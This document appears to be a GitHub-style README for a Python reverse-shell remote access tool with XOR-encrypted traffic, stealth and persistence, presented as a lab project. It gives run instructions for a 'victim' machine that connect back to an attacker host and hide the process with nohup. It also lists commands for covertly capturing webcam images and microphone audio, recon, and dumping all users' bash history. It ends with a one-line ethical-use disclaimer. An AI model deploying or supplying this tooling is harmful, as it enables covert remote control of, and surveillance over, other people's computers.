# 🐍 Reverse Shell RAT with XOR Encryption

## 📘 Learning Path

This project started as a basic Python shell and evolved into a stealthy, encrypted reverse shell:

1. 🛠️ **Basic Shell**: Socket + subprocess commands
2. 🔁 **Hybrid (Bind + Reverse)**
3. 🔄 **Reverse-Only Shell** (more stealthy)
4. 🔐 **XOR Encryption**
5. 🧾 **Session Logging**
6. 👻 **Background Execution + Persistence**
7. 🔭 **Cool Shell Command Extensions**

---

## 🎯 Overview

This tool enables remote shell access from a victim Ubuntu machine to a Kali controller using encrypted reverse sockets.

---

## ⚙️ Features

- Reverse TCP shell
- XOR-encrypted traffic
- Command execution with shell output
- Screenshot support
- Timestamped logging
- Runs silently in background
- No external Python packages

---

## 🚀 How to Use

### Kali (Attacker)

```bash
python3 listener.py
```

### Ubuntu (Victim)

Edit agent file:

```python
REVERSE_HOST = "192.168.56.103"  # ← change to Kali IP
```

Then run it in the background:

```bash
pkill -f agent.py
nohup python3 agent_reverse.py &>/dev/null &
```

---

## 🎮 Cool Shell Commands to Run

### 📷 Webcam Snapshot

```bash
fswebcam -r 640x480 --jpeg 85 -D 1 /tmp/webcam.jpg && cat /tmp/webcam.jpg
```

**Install:**
```bash
sudo apt install fswebcam
```

---

### 🎤 Microphone Audio (10 sec)

```bash
arecord -f cd -d 10 /tmp/audio.wav && cat /tmp/audio.wav
```

**Install:**
```bash
sudo apt install alsa-utils
```

---

### 🧠 Recon Combo

```bash
whoami && hostname && uname -a && ip a && ps aux
```

Get full snapshot of identity, system info, IP, and processes.

---

### 📁 List Bash History

```bash
find /home -name .bash_history -exec cat {} \;
```

---

## ⚠️ Ethical Use Only

This tool is for lab use only. Do not use it on any system without explicit permission.

---

